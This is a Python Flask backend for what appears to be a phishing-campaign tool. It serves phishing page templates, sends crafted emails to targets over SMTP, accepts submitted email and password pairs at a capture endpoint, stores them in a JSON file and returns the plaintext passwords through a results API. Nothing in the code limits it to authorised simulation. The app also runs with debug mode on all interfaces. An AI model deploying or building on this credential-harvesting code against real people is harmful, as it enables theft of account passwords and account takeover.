import json
import os
import smtplib
import ssl
from flask import Flask, render_template, jsonify, request, send_from_directory, url_for, abort
from config import get_smtp_settings, get_port_forwarding_settings, save_user_settings
from jinja2 import Environment, FileSystemLoader, select_autoescape
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Paths for phishing templates and static files
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PHISHING_TEMPLATE_FOLDER = os.path.join(BASE_DIR, "backend", "templates")
PHISHING_STATIC_FOLDER = os.path.join(BASE_DIR, "backend", "static")
LOG_FILE = os.path.join(BASE_DIR, "backend", "data", "logs.json")
CAPTURED_LOG_FILE = os.path.join(os.path.dirname(__file__), "backend", "data", "captured.json")

# Ensure logs directory exists
os.makedirs(os.path.dirname(CAPTURED_LOG_FILE), exist_ok=True)

# Ensure logs directory exists
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

# Create a Jinja2 environment for phishing templates
phishing_env = Environment(
    loader=FileSystemLoader(PHISHING_TEMPLATE_FOLDER),
    autoescape=select_autoescape(['html', 'xml'])
)

@app.route('/')
def homePage():
    print("\nAccessed homepage\n")
    return render_template("index.html")

@app.route('/templates')
def tempPage():
    print("\nAccessed templates page\n")
    return render_template("templates.html")

@app.route('/settings')
def settingsPage():
    print("\nAccessed settings page\n")
    return render_template("settings.html")

@app.route('/campaigns')
def campPage():
    print("\nAccessed campaigns page")
    return render_template("campaigns.html")

@app.route('/documentation')
def docPage():
    print("\nAccessed documentation page\n")
    return render_template("documentation.html")

@app.route('/results')
def resPage():
    print("\nAccessed results page\n")
    return render_template("results.html")

# API to get current SMTP settings (User settings take priority)
@app.route("/api/smtp-settings", methods=["GET"])
def get_smtp():
    return jsonify(get_smtp_settings())

# API to get current Port Forwarding settings (User settings take priority)
@app.route("/api/port-forwarding-settings", methods=["GET"])
def get_port_forwarding():
    return jsonify(get_port_forwarding_settings())

# API to save user-defined settings (Stored inside `user` section of `config.yaml`)
@app.route("/api/settings", methods=["POST"])
def update_settings():
    data = request.json
    save_user_settings(data)
    return jsonify({"message": "Settings saved successfully!"})

@app.route("/phish/<template_name>")
def serve_phishing_page(template_name):
    """ Serve phishing HTML templates dynamically """
    template_file = f"{template_name}.html"
    template_path = os.path.join(PHISHING_TEMPLATE_FOLDER, template_file)

    # Ensure the phishing template exists
    if not os.path.exists(template_path):
        print(f"❌ Error: Phishing template '{template_file}' not found in '{PHISHING_TEMPLATE_FOLDER}'")
        abort(404, description="Template not found")

    # Render phishing template with `url_for` function
    template = phishing_env.get_template(template_file)
    return template.render(url_for=url_for)

# Serve static files (CSS, JS, Images) for phishing templates
@app.route('/phish/static/<path:filename>')
def serve_phishing_static(filename):
    """ Serve static files for phishing templates """
    file_path = os.path.join(PHISHING_STATIC_FOLDER, filename)

    if not os.path.exists(file_path):
        print(f"❌ Error: Static file '{filename}' not found in '{PHISHING_STATIC_FOLDER}'")
        abort(404, description="Static file not found")

    return send_from_directory(PHISHING_STATIC_FOLDER, filename)

@app.route("/api/host-template", methods=["POST"])
def host_template():
    """ API to host phishing templates dynamically """
    try:
        data = request.json
        template_name = data.get("template", "").strip()

        if not template_name:
            return jsonify({"error": "Template name is required"}), 400

        # Generate phishing link
        phishing_link = f"http://127.0.0.1:5000/phish/{template_name}"

        return jsonify({"message": "Template hosted successfully!", "link": phishing_link})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

def log_campaign(data):
    """ Append campaign data to logs.json in /backend/data """
    try:
        # Load existing log data if file exists
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as file:
                try:
                    logs = json.load(file)
                except json.JSONDecodeError:
                    logs = []
        else:
            logs = []

        # Add timestamp
        data["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Append new log entry
        logs.append(data)

        # Write updated logs back to file
        with open(LOG_FILE, "w", encoding="utf-8") as file:
            json.dump(logs, file, indent=4)

        print(f"✅ Campaign logged: {data['campaignName']}")
    except Exception as e:
        print(f"❌ Error logging campaign: {e}")

@app.route("/api/send-campaign", methods=["POST"])
def send_campaign():
    try:
        data = request.json  # Get campaign data from frontend

        # Get SMTP settings (use default unless overridden)
        smtp_settings = get_smtp_settings()
        smtp_server = smtp_settings["server"]
        smtp_port = smtp_settings["port"]
        encryption = smtp_settings["encryption"]

        sender_email = data["senderEmail"]
        sender_password = data["senderPassword"]
        email_subject = data["emailTopic"]
        email_body = data["emailBody"]
        cc_email = data.get("ccEmails", "").strip()
        target_email = data["targetEmail"].strip()  # Single target email

        # Validate target email
        if not target_email:
            return jsonify({"error": "No target email provided"}), 400

        # Create Email Message
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = target_email
        msg["Subject"] = email_subject
        msg.attach(MIMEText(email_body, "plain"))  # Plain text email

        # Add CC if provided
        if cc_email:
            msg["Cc"] = cc_email
            recipients = [target_email, cc_email]  # Send to target & CC
        else:
            recipients = [target_email]  # Only send to target

        # Send email using SMTP
        context = ssl.create_default_context()
        if encryption.lower() == "tls":
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls(context=context)
        elif encryption.lower() == "ssl":
            server = smtplib.SMTP_SSL(smtp_server, smtp_port, context=context)
        else:
            server = smtplib.SMTP(smtp_server, smtp_port)

        # Authenticate & Send Email
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipients, msg.as_string())
        server.quit()

        # Log campaign
        campaign_data = {
            "template": data.get("template", "N/A"),
            "campaignName": data["campaignName"],
            "campaignDescription": data["campaignDescription"],
            "senderEmail": sender_email,
            "emailTopic": email_subject,
            "emailBody": email_body,
            "targetEmail": target_email,
            "sentTo": recipients
        }
        log_campaign(campaign_data)

        return jsonify({"message": "Campaign email sent successfully!", "sent_to": recipients})

    except smtplib.SMTPAuthenticationError:
        return jsonify({"error": "SMTP authentication failed. Use an App Password if using Gmail."}), 401
    except smtplib.SMTPException as e:
        return jsonify({"error": f"SMTP error: {str(e)}"}), 500
    except Exception as e:
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500

def log_credentials(data):
    """ Append captured credentials to captured.json """
    try:
        if os.path.exists(CAPTURED_LOG_FILE):
            with open(CAPTURED_LOG_FILE, "r", encoding="utf-8") as file:
                try:
                    logs = json.load(file)
                except json.JSONDecodeError:
                    logs = []
        else:
            logs = []

        data["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logs.append(data)

        with open(CAPTURED_LOG_FILE, "w", encoding="utf-8") as file:
            json.dump(logs, file, indent=4)

        print(f"✅ Credentials logged: user={data['email']} | campaign={data['campaign']}")
    except Exception as e:
        print(f"❌ Error logging credentials: {e}")

@app.route("/api/capture-credentials", methods=["POST"])
def capture_credentials():
    try:
        data = request.json
        if not data.get("email") or not data.get("password"):
            return jsonify({"error": "Invalid data"}), 400

        log_credentials(data)
        return jsonify({"message": "Credentials captured successfully!"})

    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
@app.route("/api/latest-campaign", methods=["GET"])
def get_latest_campaign():
    """ Fetch the most recent campaign from logs.json """
    try:
        if not os.path.exists(LOG_FILE):
            return jsonify({"error": "No campaigns found"}), 404

        with open(LOG_FILE, "r", encoding="utf-8") as file:
            try:
                logs = json.load(file)
            except json.JSONDecodeError:
                return jsonify({"error": "Invalid log file format"}), 500

        if not logs:
            return jsonify({"error": "No campaigns recorded"}), 404

        latest_campaign = logs[-1]  # Get last campaign entry
        return jsonify({"campaign_name": latest_campaign.get("campaignName", "Unknown Campaign")})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

# 📌 API to fetch results overview (total campaigns & credentials captured)
@app.route("/api/results/overview", methods=["GET"])
def get_results_overview():
    try:
        # Load logs
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                campaigns = json.load(f)
        else:
            campaigns = []

        # Load captured credentials
        if os.path.exists(CAPTURED_LOG_FILE):
            with open(CAPTURED_LOG_FILE, "r") as f:
                credentials = json.load(f)
        else:
            credentials = []

        return jsonify({
            "total_campaigns": len(campaigns),
            "total_credentials": len(credentials)
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/results/campaigns", methods=["GET"])
def get_campaign_results():
    try:
        # Load logs
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                campaign_logs = json.load(f)
        else:
            campaign_logs = []

        # Load captured credentials
        if os.path.exists(CAPTURED_LOG_FILE):
            with open(CAPTURED_LOG_FILE, "r") as f:
                captured_credentials = json.load(f)
        else:
            captured_credentials = []

        # Merge campaigns with captured credentials
        campaign_results = []
        for campaign in campaign_logs:
            template_name = campaign.get("template")  # Switch campaign name with template
            sender_email = campaign.get("senderEmail")
            timestamp = campaign.get("timestamp")

            # Find credentials associated with this campaign
            matching_credentials = [
                cred for cred in captured_credentials if cred["campaign"] == campaign.get("campaignName")
            ]

            for cred in matching_credentials:
                campaign_results.append({
                    "template_name": template_name,  # Use template name instead
                    "timestamp": timestamp,
                    "sender_email": sender_email,
                    "target_email": cred["email"],
                    "username": cred["email"],  # Assuming username is the email
                    "password": cred["password"]
                })

        return jsonify(campaign_results)

    except Exception as e:
        return jsonify({"error": str(e)}), 500

app.run(host='0.0.0.0', debug=True)